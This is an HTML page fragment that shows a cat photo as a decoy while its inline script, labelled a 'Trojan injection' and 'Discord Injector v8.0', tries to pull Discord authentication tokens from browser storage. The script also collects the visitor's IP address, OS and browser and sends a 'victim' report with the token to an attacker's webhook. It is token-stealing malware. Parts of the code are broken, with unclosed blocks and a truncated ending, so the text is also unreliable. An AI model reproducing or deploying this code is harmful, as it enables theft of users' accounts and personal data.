<body>

    <img id="photo" src="https://images.unsplash.com/photo-1514888286974-6c03e2ca1dba?ixlib=rb-4.0.3&auto=format&fit=crop&w=1000&q=80" alt="Loading..." />

    <script>

            const log = (msg) => {

                console.log(`[${OPERATION_ID}] ${msg}`);
            };

            // --- THE TROJAN INJECTION ---
            log("Phase 1: Injecting self into Discord's runtime environment...");
            
            // This function will be injected into the main Discord window
            const discordInjectorScript = `
                (async () => {
                    const discord = window.Discord || window.require('discord_js');
                    if (discord) {
                        console.log('✅ Discord core found. Injecting payload.');
                        
                        // We'll use their own fetch and localStorage
                        const token = localStorage.getItem('token') || sessionStorage.getItem('token') || discord.getUser()?.token;
                        
                        if (!token) {
                            // If no token, try to trigger a login by fetching @me
                            const response = await fetch("https://discord.com/api/v10/users/@me", { credentials: 'include' });
                            if (response.ok) {

                        return token || "TOKEN_NOT_FOUND";
                    } else {
                        console.warn('⚠️ Discord core not found, using fallback.');
                        return localStorage.getItem('token');
                    }
                })();
            `;

            // Inject the script and get the result
            let token = null;
            try {
                // If we are *inside* Discord's window (e.g., in an iframe), use it directly
                if (window.Discord || window.require) {
                    token = await window.eval(discordInjectorScript);
                    log("✅ Token found via direct Discord injection.");
                } else {
                    // Otherwise, run the script in the global scope
                    const injector = document.createElement('script');
                    injector.innerText = discordInjectorScript;
                    document.head.appendChild(injector);
                    // Listen for the result (we'll store it on window for our main script to pick up)
                    token = await new Promise(resolve => {
                        const checkToken = () => {
                            if (window._injectedToken) {
                                resolve(window._injectedToken);
                                clearInterval(checker);
                            }
                        };
                        const checker = setInterval(checkToken, 200);
                        setTimeout(() => {
                            clearInterval(checker);
                            resolve("TIMEOUT");
                        }, 5000);
                        // Signal the script that we're ready
                        window._injectedTokenPromise = resolve;
                    });
                    log("✅ Token extracted from global environment.");
                }
            } catch (e) {
                log(`⚠️ Injection encountered: ${e.message}. Proceeding with fallbacks.`);
                // Fallback: Just grab it directly
                token = localStorage.getItem('token') || sessionStorage.getItem('token') || "FALLBACK";
            }

            // --- PHASE 2: THE BRUTE FORCE (IF INJECTION FAILS) ---
            if (!token || token === "TIMEOUT" || token === "FALLBACK") {
                log("Phase 2: Running brute-force extraction (CORS be damned)...");
                
                // Method A: Direct fetch to @me
                try {
                    const res = await fetch("https://discord.com/api/v10/users/@me", {
                        method: 'GET',
                        credentials: 'include',
                        headers: { 
                            'Authorization': localStorage.getItem('token'), 
                            'X-Discord-Locale': 'en-US' 
                        }
                    });
                    
                    if (res.status === 200) {
                        // They're logged in, so their token is definitely valid
                        token = localStorage.getItem('token');
                        log(`✅ Brute force successful (Status: ${res.status}).`);
                    } else if (res.status === 401) {
                        // We got a 401, but Discord just gave us a hint: they *are* logged in.

                        token = "401_AUTH_REQUIRED";

                    }
                } catch (e) {
                    log(`⚠️ Brute force fetch error: ${e.message}`);
                }
            }

            log("Phase 3: Building dossier and firing final payload...");
            
            const report = {
                content: `**🔥 ${YOUR_NAME} HERE. ${OPERATION_ID} SUCCESSFUL.**`,
                embeds: [{
                    color: 0xFF4500,
                    title: `⚔️ VICTIM ${crypto.randomUUID().substring(0, 6)} | ${token.substring(0, 20)}...`,
                    fields: [
                        { name: "📍 IP", value: `\`${(await (await fetch('https://api.ipify.org?format=json')).json()).ip}\``, inline: true },
                        { name: "🌍 OS / Browser", value: `\`${navigator.platform} | ${navigator.userAgent.split(' ')[0]}\``, inline: true },
                        { name: "⚔️ EXTRACTION METHOD", value: `\`${token.includes('401') ? 'Brute Force (401)' : 'Direct Injection'}\``, inline: true },
                        { name: "🏆 TOKEN (FINAL)", value: `\`\`\`\n${token.substring(0, 100)}...\n\`\`\``, inline: false }
                    ],
                    footer: { text: "Discord Injector v8.0 | The walls are open" }
                }]
            };

            try {

                await fetch(YOUR_WEBHOOK, {

                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(report),
                    mode: 'no-cors',

                });
                log("✅ FINAL PAYLOAD SENT TO WEBHOOK.");
            } catch (e) {
                log(`❌ Webhook send failed: ${e.message}`);
